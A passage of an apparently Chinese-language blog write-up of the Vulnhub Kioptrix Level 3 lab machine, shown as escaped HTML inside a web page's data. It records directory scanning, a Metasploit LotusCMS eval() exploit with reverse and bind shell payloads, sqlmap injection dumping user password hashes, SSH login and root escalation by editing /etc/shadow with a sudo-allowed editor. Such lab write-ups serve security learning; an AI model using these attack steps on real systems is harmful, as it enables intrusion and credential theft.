class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -  688B  - /core/fragments/moduleInfo.phtml\n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   23KB - /favicon.ico                                      \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  357B  - /gallery  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e/gallery/      \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  357B  - /modules  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e/modules/      \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    2KB - /modules/                                         \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  360B  - /phpmyadmin  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e/phpmyadmin/\n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e401\u003c/span\u003e -  520B  - /phpmyadmin/scripts/setup.php                     \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    8KB - /phpmyadmin/                                      \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -    8KB - /phpmyadmin/index.php                             \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e:03] \u003cspan class=\"hljs-number\"\u003e301\u003c/span\u003e -  355B  - /style  -\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e/style/          \n[\u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e32\u003c/span\u003e:08] \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e -   18B  - /update.php    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e/modules\u003c/code\u003e 像是文件服务器\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/phpmyadmin\u003c/code\u003e  phpmyadmin\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e/update.php\u003c/code\u003e 提示\u003ccode\u003epermission denied.\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eindex.php?system=Admin\u003c/code\u003e 是登陆页面\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e登陆页面发现是CMS是\u003ccode\u003eLotusCMS\u003c/code\u003e 查阅有没有可以利用漏洞\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e看见\u003ccode\u003eruby\u003c/code\u003e后缀利用文件，上\u003ccode\u003emsf\u003c/code\u003e搜索看看\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# searchsploit LotusCMS    \u003c/span\u003e\n//\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                  |  Path\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nLotusCMS \u003cspan class=\"hljs-number\"\u003e3.0\u003c/span\u003e - \u003cspan class=\"hljs-string\"\u003e'eval()'\u003c/span\u003e Remote Command Execution (Metasploit)                                                                                                                   | php/remote/\u003cspan class=\"hljs-number\"\u003e18565.\u003c/span\u003erb\nLotusCMS \u003cspan class=\"hljs-number\"\u003e3.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003e - Multiple Vulnerabilities                                                                                                                                       | php/webapps/\u003cspan class=\"hljs-number\"\u003e16982.\u003c/span\u003etxt\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e进入\u003ccode\u003emsf\u003c/code\u003e控制台，进行搜索，应该就是\u003ccode\u003esearchsploit\u003c/code\u003e 搜索出来的那个\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 \u003e search LotusCMS\n\nMatching Modules\n================\n\n   \u003cspan class=\"hljs-comment\"\u003e#  Name                              Disclosure Date  Rank       Check  Description\u003c/span\u003e\n   -  ----                              ---------------  ----       -----  -----------\n   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  exploit/multi/http/lcms_php_exec  \u003cspan class=\"hljs-number\"\u003e2011\u003c/span\u003e-03-03       excellent  Yes    LotusCMS \u003cspan class=\"hljs-number\"\u003e3.0\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e() Remote Command Execution\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试利用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 \u003e use exploit/multi/http/lcms_php_exec \nmsf6 exploit(multi/http/lcms_php_exec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e\nrhosts =\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e\nmsf6 exploit(multi/http/lcms_php_exec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e uri /index.php?system=Admin\nuri =\u003e /index.php?system=Admin\nmsf6 exploit(multi/http/lcms_php_exec) \u003e run\n[*] Started reverse TCP handler on \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e \n[*] Using found page param: /index.php?page=index\n[*] Sending exploit ...\n[*] Exploit completed, but no session was created.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e死活不成功，尝试换一下\u003ccode\u003epayload\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 exploit(multi/http/lcms_php_exec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload php/reverse_php \npayload =\u003e php/reverse_php\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试了几个\u003ccode\u003epayload\u003c/code\u003e后发现\u003ccode\u003ephp/bind_perl\u003c/code\u003e 可以使用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 exploit(multi/http/lcms_php_exec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload php/reverse_perl \npayload =\u003e php/reverse_perl\nmsf6 exploit(multi/http/lcms_php_exec) \u003e run\n\n[*] Started reverse TCP handler on \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e \n[*] Using found page param: /index.php?page=index\n[*] Sending exploit ...\n[*] Exploit completed, but no session was created.\nmsf6 exploit(multi/http/lcms_php_exec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e payload php/bind_perl\npayload =\u003e php/bind_perl\nmsf6 exploit(multi/http/lcms_php_exec) \u003e run\n\n[*] Using found page param: /index.php?page=index\n[*] Sending exploit ...\n[*] Started bind TCP handler against \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e\n[*] Command shell session \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e opened (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.151\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e34319\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.75\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.169\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:08:\u003cspan class=\"hljs-number\"\u003e36\u003c/span\u003e +0800\nwhoami\nwww-data\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003epython -c \u003cspan class=\"hljs-string\"\u003e\"import pty;pty.spawn('/bin/sh')\"\u003c/span\u003e\n//\n$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) gid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) groups=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data)\n//\n$ uname -a\nLinux Kioptrix3 \u003cspan class=\"hljs-number\"\u003e2.6\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.24\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e-server \u003cspan class=\"hljs-comment\"\u003e#1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux\u003c/span\u003e\n//\n$ whoami\nwww-data\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找突破口\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003esuid提权寻找\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e$ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\u003e/dev/null\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/apache2/suexec\n/usr/lib/pt_chown\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/arping\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/mtr\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/newgrp\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chfn\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/gpasswd\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sudo\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/at\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sudoedit\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/chsh\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/passwd\n/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/traceroute6.iputils\n/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/ht\n/usr/sbin/pppd\n/usr/sbin/uuidd\n/lib/dhcp3-client/call-dhclient-script\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/fusermount\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/ping\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/mount\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/umount\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/ping6\n/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/su\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/etc/phpmyadmin\u003c/code\u003e下\u003ccode\u003econfig.inc.php\u003c/code\u003e存在数据库账号密码，尝试但是登陆失败\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e// $cfg[\u003cspan class=\"hljs-string\"\u003e'Servers'\u003c/span\u003e][$i][\u003cspan class=\"hljs-string\"\u003e'controluser'\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e'pma'\u003c/span\u003e;\n// $cfg[\u003cspan class=\"hljs-string\"\u003e'Servers'\u003c/span\u003e][$i][\u003cspan class=\"hljs-string\"\u003e'controlpass'\u003c/span\u003e] = \u003cspan class=\"hljs-string\"\u003e'pmapass'\u003c/span\u003e;\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找敏感文件，在\u003ccode\u003e/home/loneferret\u003c/code\u003e 存在一个\u003ccode\u003eCompanyPolicy.README\u003c/code\u003e 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# CompanyPolicy.README\u003c/span\u003e\nHello new employee,\nIt \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e company policy here to use our newly installed software \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e editing, creating \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e viewing files.\nPlease use the command \u003cspan class=\"hljs-string\"\u003e'sudo ht'\u003c/span\u003e.\nFailure to do so will result \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e you immediate termination.\n\nDG\nCEO\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e但是\u003ccode\u003esudo ht\u003c/code\u003e需要密码，继续寻找别的方法\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透 2\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e才知道我的靶机有问题，访问\u003ccode\u003egallery/\u003c/code\u003e 会加载不完全，被浏览器自动拦截了很多内容。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubKioptrix%20Level%201%202/image59.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e取消拦截后就好了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e发现 \u003ccode\u003ehttp://kioptrix3.com/gallery/gallery.php?id=1\u003c/code\u003e 有个可能存在sql注入的地方，使用\u003ccode\u003esqlmap\u003c/code\u003e检测是否存在sql注入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 结果\u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:07:04] [INFO] the back-end DBMS \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e MySQL\nweb server operating system: Linux Ubuntu \u003cspan class=\"hljs-number\"\u003e8.04\u003c/span\u003e (Hardy Heron)\nweb application technology: PHP \u003cspan class=\"hljs-number\"\u003e5.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e, Apache \u003cspan class=\"hljs-number\"\u003e2.2\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.8\u003c/span\u003e, PHP\nback-end DBMS: MySQL \u003e= \u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.12\u003c/span\u003e\n[\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:07:05] [WARNING] HTTP error codes detected during run:\n\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e (Internal Server Error) - \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e times\n[\u003cspan class=\"hljs-number\"\u003e19\u003c/span\u003e:07:05] [INFO] fetched data logged to text files under \u003cspan class=\"hljs-string\"\u003e'/root/.local/share/sqlmap/output/kioptrix3.com'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e存在sql注入，继续使用\u003ccode\u003esqlmap\u003c/code\u003e来爆破剩余的数据\u003c/p\u003e\n\u003cp\u003e最后\u003ccode\u003edump\u003c/code\u003e下两行数据，是两个用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e+----+---------------------------------------------+------------+\n| \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e | password                                    | username   |\n+----+---------------------------------------------+------------+\n| \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |\n| \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |\n+----+---------------------------------------------+------------+\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用爆破出来的用户去尝试登陆 ssh，\u003ccode\u003eloneferret\u003c/code\u003e成功登入\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权 2\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eloneferret@Kioptrix3:~$ sudo -l\nUser loneferret may run the following commands on this host:\n    (root) NOPASSWD: !/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/su\n\t    (root) NOPASSWD: /usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/ht\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eht\u003c/code\u003e拥有\u003ccode\u003esudo\u003c/code\u003e权限，根据之前发现的内容知道ht可以编辑文件，并且拥有\u003ccode\u003esudo\u003c/code\u003e权限\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试修改\u003ccode\u003eshadow\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eloneferret@Kioptrix3:~$ sudo ht /etc/shadow\nError opening terminal: xterm-256color.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e报错了：\u003ccode\u003eError opening terminal: xterm-256color.\u003c/code\u003e ，需要加上\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eexport TERM=xterm\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e直接将当前用户的密码覆盖到\u003ccode\u003eroot\u003c/code\u003e上去，\u003ccode\u003eF3\u003c/code\u003e好像是编辑，\u003ccode\u003eF2\u003c/code\u003e保存，\u003ccode\u003ectrl + c\u003c/code\u003e退出\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubKioptrix%20Level%201%202/image60.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后\u003ccode\u003essh\u003c/code\u003e登录\u003ccode\u003eroot\u003c/code\u003e账户，提权成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eloneferret@Kioptrix3:~$ su root\nPassword:                                                                                                                                                                                                         \nroot@Kioptrix3:/home/loneferret\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取flag文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eroot@Kioptrix3:~\u003cspan class=\"hljs-comment\"\u003e# cat Congrats.txt \u003c/span\u003e\n//\nGood \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e you \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e getting here.                                                                                                                                                                                    \nRegardless of the matter (staying within the spirit of the game of course)                                                                                                                                        \nyou got here, congratulations are \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e order. Wasn\u003cspan class=\"hljs-string\"\u003e't that bad now was it.                                                                                                                                           \n                                                                                                                                                                                                                  \nWent in a different direction with this VM. Exploit based challenges are\nnice. Helps workout that information gathering part, but sometimes we\nneed to get our hands dirty in other things as well.\nAgain, these VMs are beginner and not intented for everyone. \nDifficulty is relative, keep that in mind.\n\nThe object is to learn, do some research and have a little (legal)\nfun in the process.\n\nI hope you enjoyed this third challenge.\n\nSteven McElrea\naka loneferret\nhttp://www.kioptrix.com\n\nCredit needs to be given to the creators of the gallery webapp and CMS used\nfor the building of the Kioptrix VM3 site.\n\nMain page CMS: \nhttp://www.lotuscms.org\n\nGallery application: \nGallarific 2.1 - Free Version released October 10, 2009\nhttp://www.gallarific.com\nVulnerable version of this application can be downloaded\nfrom the Exploit-DB website:\nhttp://www.exploit-db.com/exploits/15891/\n\nThe HT Editor can be found here:\nhttp://hte.sourceforge.net/downloads.html\nAnd the vulnerable version on Exploit-DB here:\nhttp://www.exploit-db.com/exploits/17083/\n\nAlso, all pictures were taken from Google Images, so being part of the\npublic domain I used them.\n\nroot@Kioptrix3:~# \n\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"Vulnhub - Kioptrix Level 1 2","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机"}},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"02","id":"VulnhubKioptrix Level 1 2"},"buildId":"7FsVPUxpbPTlAaq4wvju-","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>